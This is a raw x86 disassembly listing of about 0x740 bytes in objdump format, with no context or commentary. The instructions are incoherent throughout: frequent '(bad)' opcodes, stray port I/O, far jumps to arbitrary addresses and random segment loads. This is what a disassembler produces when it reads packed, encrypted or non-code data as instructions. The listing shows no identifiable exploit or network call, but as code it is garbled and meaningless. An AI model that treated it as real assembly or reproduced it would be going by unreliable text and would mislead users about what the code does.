  41a447:	pop    ebx
  41a448:	or     eax,0x1b19356c
  41a44d:	(bad)  
  41a44e:	pusha  
  41a44f:	je     0x41a3dd
  41a451:	ds jmp 0x34c5e1ad
  41a457:	scas   al,BYTE PTR es:[edi]
  41a458:	dec    edx
  41a459:	dec    ebp
  41a45a:	or     eax,0xe10bb1f1
  41a45f:	xchg   ch,bh
  41a461:	nop
  41a462:	or     DWORD PTR [eax+ebx*8],0x4
  41a466:	dec    esi
  41a467:	imul   ecx,DWORD PTR [esi-0x27b8cc50],0x6b
  41a46e:	or     edx,DWORD PTR [esi+0x3e]
  41a471:	jge    0x41a4ce
  41a473:	in     al,0x5a
  41a475:	dec    ebx
  41a476:	jmp    0xd533c5c3
  41a47b:	in     al,dx
  41a47c:	jb     0x41a469
  41a47e:	clc    
  41a47f:	mov    ecx,0x2a78a672
  41a484:	xchg   ebx,eax
  41a485:	mov    esi,0xc4a85060
  41a48a:	add    eax,0x9d5f4383
  41a48f:	sbb    al,0x11
  41a491:	inc    edx
  41a492:	xor    DWORD PTR [edi],ebp
  41a494:	lock fimul DWORD PTR [ecx-0x16]
  41a498:	retf   
  41a499:	mov    bh,0x4d
  41a49b:	lods   al,BYTE PTR ds:[esi]
  41a49c:	stos   BYTE PTR es:[edi],al
  41a49d:	jle    0x41a4a0
  41a49f:	jge    0x41a452
  41a4a1:	(bad)  
  41a4a2:	rcr    eax,0x24
  41a4a5:	jne    0x41a479
  41a4a7:	xor    BYTE PTR [ebx],bh
  41a4a9:	gs jecxz 0x41a4fc
  41a4ac:	jo     0x41a4fc
  41a4ae:	loopne 0x41a448
  41a4b0:	pop    eax
  41a4b1:	cmp    al,0x27
  41a4b3:	mov    ebp,?
  41a4b5:	lds    edx,FWORD PTR [eax-0x71]
  41a4b8:	daa    
  41a4b9:	dec    eax
  41a4ba:	popf   
  41a4bb:	cld    
  41a4bc:	out    0xa0,al
  41a4be:	pop    es
  41a4bf:	or     DWORD PTR [edi+0x38234db3],edx
  41a4c5:	retf   0x3a53
  41a4c8:	jge    0x41a4e6
  41a4ca:	mov    bh,0x5d
  41a4cc:	stos   BYTE PTR es:[edi],al
  41a4cd:	gs inc ecx
  41a4cf:	mov    ah,0xfa
  41a4d1:	dec    si
  41a4d3:	sub    dh,bl
  41a4d5:	sub    bh,ah
  41a4d7:	jo     0x41a50f
  41a4d9:	dec    ebp
  41a4da:	imul   ebp,DWORD PTR [esi+0x76],0xffffffd1
  41a4de:	and    al,ah
  41a4e0:	xchg   edi,ecx
  41a4e2:	dec    ebx
  41a4e3:	pop    ebp
  41a4e4:	xchg   esp,ebp
  41a4e6:	clc    
  41a4e7:	push   es
  41a4e8:	and    al,dh
  41a4ea:	mov    DWORD PTR ds:0x97374f44,ebp
  41a4f0:	cs (bad) 
  41a4f2:	cld    
  41a4f3:	gs dec edx
  41a4f5:	stos   BYTE PTR es:[edi],al
  41a4f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4f7:	ja     0x41a4ce
  41a4f9:	jge    0x41a4c0
  41a4fb:	push   0xffffff83
  41a4fd:	stos   DWORD PTR es:[edi],eax
  41a4fe:	pop    ebx
  41a4ff:	mov    edx,0x93a3d0e
  41a504:	ss ins DWORD PTR es:[di],dx
  41a507:	js     0x41a56b
  41a509:	sbb    ebp,edi
  41a50b:	lods   al,BYTE PTR ds:[esi]
  41a50c:	push   0x8b632366
  41a511:	lds    esp,FWORD PTR [eax+0x45]
  41a514:	sbb    ch,bl
  41a516:	pop    ss
  41a517:	shl    DWORD PTR [esi+0x437b3c4c],1
  41a51d:	mov    dh,0xbd
  41a51f:	sti    
  41a520:	ficomp DWORD PTR ss:[ebx+0x41]
  41a524:	pop    ds
  41a525:	pop    eax
  41a526:	inc    esi
  41a527:	jo     0x41a5a3
  41a529:	cmp    DWORD PTR [ecx],esp
  41a52b:	sub    dh,BYTE PTR [edi+0x2c20809f]
  41a531:	mov    ds:0xa675939e,al
  41a536:	xchg   DWORD PTR [edx-0x7c],esp
  41a539:	and    ah,BYTE PTR [ecx-0x6e]
  41a53c:	mov    edx,ebx
  41a53e:	xor    eax,0x991e0c34
  41a543:	mov    eax,ds:0x6b948e48
  41a548:	or     cl,BYTE PTR [ecx-0x33b517b4]
  41a54e:	mov    ebx,0x9aaddbea
  41a553:	push   ecx
  41a554:	aad    0xf5
  41a556:	enter  0xa67c,0x4f
  41a55a:	bound  eax,QWORD PTR [edx-0x39]
  41a55d:	add    BYTE PTR [ebp+0x28],dh
  41a560:	pop    esi
  41a561:	and    BYTE PTR [ebp+0x39],dh
  41a564:	push   ds
  41a565:	js     0x41a550
  41a567:	daa    
  41a568:	xchg   ecx,eax
  41a569:	je     0x41a522
  41a56b:	or     al,0xc3
  41a56d:	(bad)  
  41a56e:	aam    0xe8
  41a570:	pushf  
  41a571:	sub    eax,0x5224a746
  41a576:	cld    
  41a577:	dec    ecx
  41a578:	sbb    DWORD PTR [edi-0x42],ebp
  41a57b:	out    dx,eax
  41a57c:	lea    edx,[edx-0x59]
  41a57f:	xchg   esi,eax
  41a580:	mov    al,ds:0xacdccffa
  41a585:	sbb    dh,bh
  41a587:	cmp    eax,0xd5b12dc3
  41a58c:	adc    DWORD PTR [edi],edx
  41a58e:	arpl   si,dx
  41a590:	jl     0x41a543
  41a592:	xor    bl,ch
  41a594:	adc    al,0xeb
  41a596:	rol    cl,0xff
  41a599:	(bad)  
  41a59a:	in     eax,0x79
  41a59c:	pop    ebx
  41a59d:	push   ecx
  41a59e:	fmulp  st(5),st
  41a5a0:	pop    esp
  41a5a1:	fild   DWORD PTR [edx]
  41a5a3:	jmp    0x41a52d
  41a5a5:	jp     0x41a539
  41a5a7:	rcr    DWORD PTR [ebx],cl
  41a5a9:	ds push ebp
  41a5ab:	add    al,0x69
  41a5ad:	push   cs
  41a5ae:	lods   eax,DWORD PTR ds:[esi]
  41a5af:	xchg   esi,eax
  41a5b0:	stc    
  41a5b1:	aas    
  41a5b2:	push   DWORD PTR [edi]
  41a5b4:	mov    WORD PTR [ebp+0x7858a5eb],gs
  41a5ba:	cli    
  41a5bb:	pop    ds
  41a5bc:	dec    edx
  41a5bd:	sub    al,0xa3
  41a5bf:	cld    
  41a5c0:	ss cli 
  41a5c2:	add    eax,0x8c5ec7ff
  41a5c7:	mov    WORD PTR ds:0x808d177a,fs
  41a5cd:	fisubr WORD PTR [ebx]
  41a5cf:	in     eax,dx
  41a5d0:	stc    
  41a5d1:	sbb    eax,ebx
  41a5d3:	dec    edx
  41a5d4:	jb     0x41a63d
  41a5d6:	(bad)  
  41a5d8:	clc    
  41a5d9:	fwait
  41a5da:	and    al,0x70
  41a5dc:	fdivr  QWORD PTR [esi+0x434ac681]
  41a5e2:	popf   
  41a5e3:	mov    WORD PTR [esp+ecx*2+0x6210b672],ss
  41a5ea:	sbb    eax,0x9309e18b
  41a5ef:	lea    ecx,[ecx]
  41a5f1:	shl    BYTE PTR [eax],cl
  41a5f3:	pusha  
  41a5f4:	stos   DWORD PTR es:[edi],eax
  41a5f5:	fwait
  41a5f6:	mov    ecx,0x601a2e36
  41a5fb:	jecxz  0x41a646
  41a5fd:	jne    0x41a613
  41a5ff:	mov    WORD PTR [ebx+0x44],es
  41a602:	push   ebx
  41a603:	cwde   
  41a604:	jl     0x41a65e
  41a606:	into   
  41a607:	mov    ch,0xaa
  41a609:	retf   0x213f
  41a60c:	outs   dx,DWORD PTR es:[esi]
  41a60e:	js     0x41a5a5
  41a610:	jl     0x41a60b
  41a612:	sbb    esi,ebx
  41a614:	ja     0x41a675
  41a616:	cmp    dl,BYTE PTR es:[ebp+0x39ba9b4e]
  41a61d:	sti    
  41a61e:	daa    
  41a61f:	mov    bl,0xe6
  41a621:	mov    dh,0x9a
  41a623:	add    eax,DWORD PTR [ecx+0x67]
  41a626:	push   ecx
  41a627:	xor    BYTE PTR [edx+edx*4],bh
  41a62a:	arpl   WORD PTR [esi-0x74993144],sp
  41a630:	mov    eax,0x167db171
  41a635:	bound  ebp,QWORD PTR [esi-0x69]
  41a638:	dec    ebx
  41a639:	add    eax,0xc856b95f
  41a63e:	or     BYTE PTR [edx+0x46],bl
  41a641:	dec    ebp
  41a642:	ficom  WORD PTR [edi-0x456dc71a]
  41a648:	mov    edx,0xfe46542e
  41a64d:	pop    ds
  41a64e:	pop    ebx
  41a64f:	repz rcl DWORD PTR [esi+0x3269e818],cl
  41a656:	push   edx
  41a657:	push   ss
  41a658:	jnp    0x41a603
  41a65a:	jno    0x41a66a
  41a65c:	mov    edi,0x996b8e81
  41a661:	loope  0x41a6dd
  41a663:	push   edi
  41a664:	popf   
  41a665:	out    0x83,al
  41a667:	pop    eax
  41a668:	add    ebp,eax
  41a66a:	aam    0x82
  41a66c:	(bad)  
  41a66e:	outs   dx,BYTE PTR ds:[esi]
  41a66f:	enter  0xdd73,0x2d
  41a673:	mov    ds:0x7fecfcc3,eax
  41a678:	sub    eax,0x3340dc37
  41a67d:	stos   BYTE PTR es:[edi],al
  41a67e:	push   es
  41a67f:	xor    edi,esp
  41a681:	int    0xbd
  41a683:	aad    0x5c
  41a685:	stos   BYTE PTR es:[edi],al
  41a686:	in     eax,0x5a
  41a688:	in     eax,0xe1
  41a68a:	mov    edx,0xe716d4e3
  41a68f:	daa    
  41a690:	sti    
  41a691:	in     al,dx
  41a692:	jecxz  0x41a692
  41a694:	pop    ds
  41a695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a696:	pop    esi
  41a697:	sbb    DWORD PTR [edx+0x34],ebx
  41a69a:	in     al,dx
  41a69b:	mov    ds:0x92763faa,al
  41a6a0:	sub    DWORD PTR ds:0x81e9ff7c,ecx
  41a6a6:	int    0x59
  41a6a8:	dec    esp
  41a6a9:	mov    bl,0x59
  41a6ab:	dec    esi
  41a6ac:	mov    eax,0x30d86f40
  41a6b1:	fwait
  41a6b2:	mov    eax,0xcb05444
  41a6b7:	hlt    
  41a6b8:	test   eax,0xb3be7bbf
  41a6bd:	imul   edi,DWORD PTR [esi-0x5e406665],0xfffffff5
  41a6c4:	mov    al,ds:0x7c3e1bd9
  41a6c9:	mov    edi,0x72b7c95e
  41a6ce:	or     DWORD PTR [edi+0x7d],ebx
  41a6d1:	sar    BYTE PTR [ebx],cl
  41a6d3:	je     0x41a739
  41a6d5:	sahf   
  41a6d6:	aas    
  41a6d7:	fiadd  DWORD PTR [ebp+0x7b]
  41a6da:	popa   
  41a6db:	sbb    al,BYTE PTR [edi]
  41a6dd:	(bad)  
  41a6de:	gs jae 0x41a6e8
  41a6e1:	pusha  
  41a6e2:	mov    esp,0x1305bb3d
  41a6e7:	outs   dx,BYTE PTR ds:[esi]
  41a6e8:	mov    cl,ch
  41a6ea:	xor    al,0xf
  41a6ec:	pop    eax
  41a6ed:	aaa    
  41a6ee:	jbe    0x41a715
  41a6f0:	stc    
  41a6f1:	mov    DWORD PTR [edi],0x1d9c3834
  41a6f7:	ror    DWORD PTR [edx],1
  41a6f9:	test   BYTE PTR [esi],al
  41a6fb:	mov    ?,edi
  41a6fd:	(bad)  
  41a6fe:	adc    eax,0x4f046eab
  41a703:	inc    ecx
  41a704:	mov    esp,0xb2064b1d
  41a709:	test   BYTE PTR [edi+0x2b],bl
  41a70c:	cdq    
  41a70d:	shr    DWORD PTR [edx],cl
  41a70f:	adc    dl,bl
  41a711:	aad    0xaa
  41a713:	(bad)
  41a716:	sbb    BYTE PTR ds:0xb76c464a,0x7f
  41a71d:	out    0x70,al
  41a71f:	jo     0x41a6b1
  41a721:	cwde   
  41a722:	jl     0x41a714
  41a724:	adc    cl,BYTE PTR [edx]
  41a726:	aad    0x93
  41a728:	ins    BYTE PTR es:[edi],dx
  41a729:	xchg   edi,eax
  41a72a:	dec    edi
  41a72b:	dec    edx
  41a72c:	sub    BYTE PTR [ebx],bl
  41a72e:	sbb    DWORD PTR [ebx],ecx
  41a730:	mov    bh,0x7d
  41a732:	inc    edi
  41a733:	ins    DWORD PTR es:[edi],dx
  41a734:	aaa    
  41a735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a736:	in     al,dx
  41a737:	loopne 0x41a752
  41a739:	adc    BYTE PTR ds:0xdbcfc549,bl
  41a73f:	(bad)  
  41a740:	push   ss
  41a741:	popf   
  41a742:	push   0x33
  41a744:	or     BYTE PTR [ecx],al
  41a746:	imul   DWORD PTR [edx+0x65]
  41a749:	loope  0x41a76c
  41a74b:	fld    TBYTE PTR [esi-0x1b]
  41a74e:	std    
  41a74f:	sar    DWORD PTR [edi-0x6d],0x55
  41a753:	or     ecx,DWORD PTR [eax]
  41a755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a756:	stos   BYTE PTR es:[edi],al
  41a757:	sub    esi,DWORD PTR [ecx+0x3a]
  41a75a:	mov    eax,ds:0x10dfa85c
  41a75f:	outs   dx,BYTE PTR ds:[esi]
  41a760:	sti    
  41a761:	out    dx,eax
  41a762:	fimul  DWORD PTR [edi-0x4a272675]
  41a768:	xor    al,ah
  41a76a:	ret    
  41a76b:	cmp    ebx,DWORD PTR [edi-0x1bc53ff2]
  41a771:	out    dx,eax
  41a772:	(bad)  
  41a774:	sub    eax,0xd29e685c
  41a779:	out    dx,al
  41a77a:	stos   BYTE PTR es:[edi],al
  41a77b:	jmp    0x41a734
  41a77d:	push   esi
  41a77e:	fucomip st,st(2)
  41a780:	mov    al,0x69
  41a782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a783:	(bad)  
  41a784:	ror    DWORD PTR [ecx],cl
  41a786:	xchg   edx,eax
  41a787:	rcl    BYTE PTR [esi],0xd0
  41a78a:	arpl   WORD PTR [ebx],si
  41a78c:	fstp   DWORD PTR ds:0x5e494621
  41a792:	nop    DWORD PTR [ecx+0x110875d2]
  41a799:	sar    BYTE PTR [ebx+0x29],0xea
  41a79d:	pusha  
  41a79e:	aaa    
  41a79f:	sar    DWORD PTR [esi+0xd],1
  41a7a2:	dec    edi
  41a7a3:	mov    ah,0x8d
  41a7a5:	mov    dh,0x39
  41a7a7:	xor    dl,dl
  41a7a9:	ffreep st(4)
  41a7ab:	push   0xffffff94
  41a7ad:	adc    eax,0x4f3bcd74
  41a7b2:	mov    esp,DWORD PTR [esi]
  41a7b4:	fmul   QWORD PTR [edx-0x64]
  41a7b7:	jmp    0x41a772
  41a7b9:	adc    esp,ebx
  41a7bb:	in     eax,0x32
  41a7bd:	cmc    
  41a7be:	popf   
  41a7bf:	mov    bl,0xd1
  41a7c1:	aam    0x57
  41a7c3:	add    eax,0x1ed370b4
  41a7c8:	jmp    0x41a7be
  41a7ca:	sbb    bh,0x4f
  41a7cd:	pop    ss
  41a7ce:	sbb    BYTE PTR [ecx+0x3013273e],cl
  41a7d4:	int    0x7c
  41a7d6:	sbb    BYTE PTR [edi],bh
  41a7d8:	xor    ch,BYTE PTR [edi+0x30df5bb9]
  41a7de:	mov    esp,0xc38d1691
  41a7e3:	xchg   ecx,eax
  41a7e4:	add    BYTE PTR [ecx-0x12],bl
  41a7e7:	push   ebx
  41a7e8:	fisubr DWORD PTR [ebx-0x79]
  41a7eb:	outs   dx,BYTE PTR gs:[esi]
  41a7ed:	out    0x21,al
  41a7ef:	xchg   BYTE PTR [eax+edi*8+0x62],ch
  41a7f3:	pop    ebp
  41a7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7f5:	in     eax,0x55
  41a7f7:	nop
  41a7f8:	rcl    BYTE PTR [edi],0xf8
  41a7fb:	mov    al,0x1a
  41a7fd:	aaa    
  41a7fe:	sub    eax,0xa3eb438f
  41a803:	gs daa 
  41a805:	stc    
  41a806:	push   ebp
  41a807:	daa    
  41a808:	sahf   
  41a809:	fwait
  41a80a:	xchg   esp,eax
  41a80b:	cdq    
  41a80c:	mov    edx,0xdba055c1
  41a811:	push   esp
  41a812:	test   al,0xaf
  41a814:	mov    al,ds:0x105d1c1b
  41a819:	aas    
  41a81a:	je     0x41a887
  41a81c:	add    eax,0x79d3ea0a
  41a821:	add    al,0x32
  41a823:	jmp    0x7304:0xd138ede8
  41a82a:	ffree  st(3)
  41a82c:	xchg   DWORD PTR [ebp-0x77],edi
  41a82f:	fcmove st,st(3)
  41a831:	and    DWORD PTR [ebx],edi
  41a833:	nop
  41a834:	aas    
  41a835:	or     DWORD PTR [edi+ebx*4],ebx
  41a838:	jl     0x41a88e
  41a83a:	out    0x7f,al
  41a83c:	daa    
  41a83d:	loopne 0x41a83f
  41a83f:	cmp    eax,0x658c9ee7
  41a844:	mov    WORD PTR [esi-0x4d131a56],?
  41a84a:	in     al,dx
  41a84b:	imul   edx,ebp,0xb517197f
  41a851:	cmp    esi,DWORD PTR [edx+0x6a]
  41a854:	je     0x41a87d
  41a856:	mov    al,0xcd
  41a858:	adc    esp,DWORD PTR [edx+edx*4-0x618dec1d]
  41a85f:	int3   
  41a860:	pushf  
  41a861:	mov    bh,0x33
  41a863:	ret    0x7e46
  41a866:	dec    esi
  41a867:	addr16 leave 
  41a869:	sub    eax,0xf658898f
  41a86e:	(bad)  
  41a870:	jo     0x41a8d3
  41a872:	in     eax,0x3a
  41a874:	sbb    al,0xc5
  41a876:	into   
  41a877:	sub    dl,BYTE PTR [esi+edx*2+0x382120f3]
  41a87e:	inc    eax
  41a87f:	(bad)  
  41a880:	jns    0x41a8b2
  41a882:	mov    ebp,0xbc1f1b85
  41a887:	test   BYTE PTR [eax-0x7f],0xac
  41a88b:	jp     0x41a85b
  41a88d:	out    0x20,eax
  41a88f:	aam    0x46
  41a891:	mov    edi,0x61960981
  41a896:	sbb    ecx,DWORD PTR [ebp+0x74c178fa]
  41a89c:	or     eax,0x3ac35963
  41a8a1:	ret    0x16fb
  41a8a4:	outs   dx,DWORD PTR ds:[esi]
  41a8a5:	daa    
  41a8a6:	push   ecx
  41a8a7:	stos   DWORD PTR es:[edi],eax
  41a8a8:	rol    edi,1
  41a8aa:	div    BYTE PTR [eax]
  41a8ac:	xlat   BYTE PTR ds:[ebx]
  41a8ad:	inc    ecx
  41a8ae:	mov    esp,0x1c48bd45
  41a8b3:	test   al,0xbf
  41a8b5:	outs   dx,DWORD PTR ds:[esi]
  41a8b6:	add    al,0x67
  41a8b8:	ror    DWORD PTR [edx-0x54ebe07c],cl
  41a8be:	pusha  
  41a8bf:	jmp    0x41a897
  41a8c1:	(bad)  
  41a8c2:	jno    0x41a860
  41a8c4:	cs mov ch,0xf0
  41a8c7:	jns    0x41a900
  41a8c9:	xor    eax,0xea0ae274
  41a8ce:	ret    
  41a8cf:	xchg   ch,ch
  41a8d1:	cmp    BYTE PTR [ebx+eiz*8+0x50],ch
  41a8d5:	sbb    eax,0x9c3463c8
  41a8da:	mov    ah,0xe1
  41a8dc:	pop    ds
  41a8dd:	xchg   al,ch
  41a8df:	aad    0x9a
  41a8e1:	dec    ecx
  41a8e2:	fmul   st(7),st
  41a8e4:	(bad)  
  41a8e5:	(bad)  
  41a8e6:	stos   BYTE PTR es:[edi],al
  41a8e7:	mov    DWORD PTR [edi+0x6a],ebx
  41a8ea:	or     eax,0xc1fc4c17
  41a8ef:	leave  
  41a8f0:	dec    edi
  41a8f1:	sti    
  41a8f2:	neg    esp
  41a8f4:	retf   0xbbd9
  41a8f7:	add    dl,al
  41a8f9:	js     0x41a8c5
  41a8fb:	out    0x4c,al
  41a8fd:	loop   0x41a890
  41a8ff:	xchg   edi,eax
  41a900:	out    0x8a,eax
  41a902:	stos   BYTE PTR es:[edi],al
  41a903:	sub    bh,bl
  41a905:	stos   DWORD PTR es:[edi],eax
  41a906:	add    cl,bl
  41a908:	stc    
  41a909:	jnp    0x41a984
  41a90b:	mov    dh,0xa3
  41a90d:	mov    cl,0xba
  41a90f:	add    esp,DWORD PTR ds:0xbe4e70d
  41a915:	mov    esp,0x3f718942
  41a91a:	pop    ebx
  41a91b:	add    BYTE PTR [ebp+0x4967c73a],cl
  41a921:	loopne 0x41a97e
  41a923:	sahf   
  41a924:	cs cmp al,0xba
  41a927:	inc    edx
  41a928:	dec    ebp
  41a929:	adc    DWORD PTR [ebx+0x5a],esp
  41a92c:	cmp    cl,cl
  41a92e:	push   ss
  41a92f:	in     eax,0x45
  41a931:	mov    cl,0xa6
  41a933:	popa   
  41a934:	push   es
  41a935:	push   ecx
  41a936:	add    al,0x5
  41a938:	mov    ebx,eax
  41a93a:	fistp  DWORD PTR [edi-0x4a]
  41a93d:	xchg   BYTE PTR [ecx+ebx*8+0x2315fa72],ch
  41a944:	sahf   
  41a945:	push   esi
  41a946:	inc    eax
  41a947:	sahf   
  41a948:	sti    
  41a949:	sbb    BYTE PTR [ecx+edx*2-0x48],dl
  41a94d:	sub    eax,0x1629912b
  41a952:	mov    ch,0x47
  41a954:	jnp    0x41a9d0
  41a956:	and    DWORD PTR [esi-0x5ff63254],ebp
  41a95c:	mov    eax,ds:0xc12c37ce
  41a961:	das    
  41a962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a963:	rcr    DWORD PTR [esi-0x5d],cl
  41a966:	pop    es
  41a967:	ss add al,bh
  41a96a:	pop    esp
  41a96b:	adc    BYTE PTR ds:0x3bf15b7a,bh
  41a971:	and    ecx,DWORD PTR [ecx]
  41a973:	aas    
  41a974:	fs in  al,0x56
  41a977:	stos   BYTE PTR es:[edi],al
  41a978:	add    al,BYTE PTR [edi+0x6a]
  41a97b:	xchg   ecx,ebx
  41a97d:	in     eax,0x40
  41a97f:	fs xchg edi,eax
  41a981:	call   0xb9218045
  41a986:	lds    ecx,FWORD PTR [eax+0xdc49a45]
  41a98c:	inc    esp
  41a98d:	adc    BYTE PTR [edx],ah
  41a98f:	jo     0x41a927
  41a991:	outs   dx,DWORD PTR ds:[esi]
  41a992:	mov    cs,WORD PTR [ecx]
  41a994:	xor    DWORD PTR [edi],edx
  41a996:	pop    ebx
  41a997:	pusha  
  41a998:	dec    edi
  41a999:	push   ebx
  41a99a:	arpl   WORD PTR [edi],cx
  41a99c:	push   0xffffffef
  41a99e:	dec    ecx
  41a99f:	xchg   ebp,eax
  41a9a0:	xchg   BYTE PTR [ebx+eax*1+0x45],bl
  41a9a4:	loop   0x41a9a7
  41a9a6:	outs   dx,BYTE PTR ds:[esi]
  41a9a7:	pop    edi
  41a9a8:	xchg   esp,eax
  41a9a9:	pop    esp
  41a9aa:	jnp    0x41a953
  41a9ac:	sub    edx,DWORD PTR [edi+0x76]
  41a9af:	fistp  QWORD PTR [edi-0xff5921]
  41a9b5:	fwait
  41a9b6:	cmp    eax,0x66cadbcd
  41a9bb:	popa   
  41a9bc:	call   0x2b817a59
  41a9c1:	into   
  41a9c2:	mov    edi,0xf9902283
  41a9c7:	jecxz  0x41a9bf
  41a9c9:	push   edx
  41a9ca:	mov    edi,0xf9c8c9b4
  41a9cf:	es and al,bh
  41a9d2:	test   ebx,edx
  41a9d4:	mov    edi,0xe835445a
  41a9d9:	cli    
  41a9da:	mov    edi,DWORD PTR [edx]
  41a9dc:	cdq    
  41a9dd:	lahf   
  41a9de:	fisub  DWORD PTR [esi]
  41a9e0:	xor    cl,BYTE PTR [eax]
  41a9e2:	sbb    ebx,DWORD PTR [edi]
  41a9e4:	push   ss
  41a9e5:	addr16 sbb bh,ch
  41a9e8:	test   DWORD PTR [edx+0x7c250d81],ebp
  41a9ee:	test   al,0xdc
  41a9f0:	icebp  
  41a9f1:	push   ebx
  41a9f2:	xchg   ecx,eax
  41a9f3:	arpl   di,cx
  41a9f5:	mov    ds:0xe8eb3686,al
  41a9fa:	stos   DWORD PTR es:[edi],eax
  41a9fb:	push   ebp
  41a9fc:	ss inc edx
  41a9fe:	test   BYTE PTR [eax-0x47],al
  41aa01:	mov    ebp,0x3bbf6a4f
  41aa06:	dec    esp
  41aa07:	jbe    0x41a9e7
  41aa09:	add    esp,edx
  41aa0b:	das    
  41aa0c:	lea    ecx,[edi]
  41aa0e:	shl    BYTE PTR [edi],0xef
  41aa11:	xchg   edi,eax
  41aa12:	adc    ah,BYTE PTR [edx+0x6]
  41aa15:	inc    ecx
  41aa16:	cmp    bl,BYTE PTR [ebp-0x10]
  41aa19:	scas   al,BYTE PTR es:[edi]
  41aa1a:	retf   
  41aa1b:	push   esp
  41aa1c:	pop    ebp
  41aa1d:	lea    esp,ss:[ebp-0x2f61fb2f]
  41aa24:	mov    al,0xa4
  41aa26:	sbb    ebx,DWORD PTR [edi-0x42ba19ad]
  41aa2c:	rcl    al,1
  41aa2e:	retf   0x8f9d
  41aa31:	pop    es
  41aa32:	in     al,0x61
  41aa34:	adc    al,0xd5
  41aa36:	sbb    BYTE PTR [esi+edi*8+0x43],ah
  41aa3a:	shl    BYTE PTR [ebx-0x80],cl
  41aa3d:	push   cs
  41aa3e:	sbb    eax,edx
  41aa40:	(bad)  
  41aa41:	xchg   ebx,eax
  41aa42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa43:	sbb    eax,0xcfbddbce
  41aa48:	sbb    BYTE PTR [eax],al
  41aa4a:	stc    
  41aa4b:	xlat   BYTE PTR ds:[ebx]
  41aa4c:	adc    al,0xd4
  41aa4e:	pop    ecx
  41aa4f:	xor    eax,DWORD PTR [ebx-0x636d5a83]
  41aa55:	and    BYTE PTR [esi+0x46],ch
  41aa58:	sub    al,0x6
  41aa5a:	jmp    0x41aac4
  41aa5c:	fstp   TBYTE PTR ds:0x13fdc6ca
  41aa62:	xchg   esi,eax
  41aa63:	test   BYTE PTR [ecx+0x12],ch
  41aa66:	mov    dh,0x6d
  41aa68:	cmp    DWORD PTR [ebp+0x74],edx
  41aa6b:	out    0xd2,eax
  41aa6d:	fnsave [ebp+0x3a]
  41aa70:	xor    ebp,DWORD PTR [eax+0x41b5f759]
  41aa76:	dec    esp
  41aa77:	stc    
  41aa78:	sbb    DWORD PTR [esi],ebp
  41aa7a:	clc    
  41aa7b:	lods   al,BYTE PTR ds:[esi]
  41aa7c:	sub    edx,ebp
  41aa7e:	xor    edx,esi
  41aa80:	jb     0x41aafd
  41aa82:	fidiv  WORD PTR [edi+0x31]
  41aa85:	lock sub ecx,DWORD PTR [ecx]
  41aa88:	sub    eax,0x131e0b0a
  41aa8d:	mov    esi,0xeb46d845
  41aa92:	jmp    0x41aa32
  41aa94:	and    BYTE PTR [edx+eax*2-0x34],cl
  41aa98:	shl    ah,1
  41aa9a:	aad    0xba
  41aa9c:	sub    al,0xbc
  41aa9e:	dec    esp
  41aa9f:	leave  
  41aaa0:	jno    0x41aa62
  41aaa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaa3:	dec    edi
  41aaa4:	imul   ecx,DWORD PTR [ebp-0x6b11acb8],0x84d5a886
  41aaae:	psrlw  mm0,QWORD PTR ds:0x23877b49
  41aab5:	test   BYTE PTR [eax+0x7b],cl
  41aab8:	fnstsw WORD PTR [ebx]
  41aaba:	and    BYTE PTR [ebp-0x69699d6b],al
  41aac0:	repnz add edx,DWORD PTR [ebp-0x346de6ff]
  41aac7:	xor    BYTE PTR [edx+0x2f],dl
  41aaca:	mov    DWORD PTR [edi-0x19],esi
  41aacd:	sub    al,0xaa
  41aacf:	mov    ds:0x6716f784,al
  41aad4:	or     ecx,DWORD PTR [edx]
  41aad6:	sbb    cl,BYTE PTR [eax+eiz*8-0x3e4e2ad]
  41aadd:	jno    0x41aad5
  41aadf:	sub    al,0x34
  41aae1:	int3   
  41aae2:	test   BYTE PTR [edx+0x3c557aa2],cl
  41aae8:	out    dx,al
  41aae9:	mov    cl,0x4a
  41aaeb:	stos   BYTE PTR es:[edi],al
  41aaec:	mov    ebx,0x8cfd2b43
  41aaf1:	repz test al,0x4e
  41aaf4:	dec    edx
  41aaf5:	dec    eax
  41aaf6:	in     al,0x3d
  41aaf8:	jecxz  0x41aaf6
  41aafa:	inc    ecx
  41aafb:	cli    
  41aafc:	arpl   si,bx
  41aafe:	out    0xd1,al
  41ab00:	enter  0x17d0,0x37
  41ab04:	sub    DWORD PTR [ebx+0x5ffd962f],ebx
  41ab0a:	test   al,0xea
  41ab0c:	cmp    ah,BYTE PTR [eax+ecx*2-0x423f8de7]
  41ab13:	or     BYTE PTR [edx],0xbe
  41ab16:	imul   edx,DWORD PTR ds:0x8a5233b2,0x61d1d90d
  41ab20:	dec    esp
  41ab21:	hlt    
  41ab22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab23:	iret   
  41ab24:	push   eax
  41ab25:	mov    ch,BYTE PTR [ebx-0x56]
  41ab28:	lea    ecx,[esi+0x63e1770]
  41ab2e:	cli    
  41ab2f:	(bad)  
  41ab30:	mov    ecx,0x43d33b5a
  41ab35:	fsubp  st(4),st
  41ab37:	mov    al,0xfc
  41ab39:	mov    cs,edi
  41ab3b:	jne    0x41aad6
  41ab3d:	retf   
  41ab3e:	xor    eax,0x86738f5a
  41ab43:	xor    eax,0x9cf2888c
  41ab48:	pop    esi
  41ab49:	(bad)  [esp+eax*4-0x441f508d]
  41ab50:	into   
  41ab51:	jmp    0x41aaf5
  41ab53:	rcr    DWORD PTR [ebp-0x70da3019],1
  41ab59:	test   eax,0x857da744
  41ab5e:	ins    BYTE PTR es:[edi],dx
  41ab5f:	mov    dh,0x6e
  41ab61:	dec    esi
  41ab62:	dec    esp
  41ab63:	gs dec edx
  41ab65:	fdivr  st,st(7)
  41ab67:	pop    eax
  41ab68:	loop   0x41abb2
  41ab6a:	imul   ebp,DWORD PTR [esi+eiz*4+0x7a84083],0x9a8d7541
  41ab75:	stc    
  41ab76:	pop    eax
  41ab77:	aaa    
  41ab78:	cmp    eax,0xae2e10f8
  41ab7d:	scas   al,BYTE PTR es:[edi]
  41ab7e:	(bad)  
  41ab80:	popf   
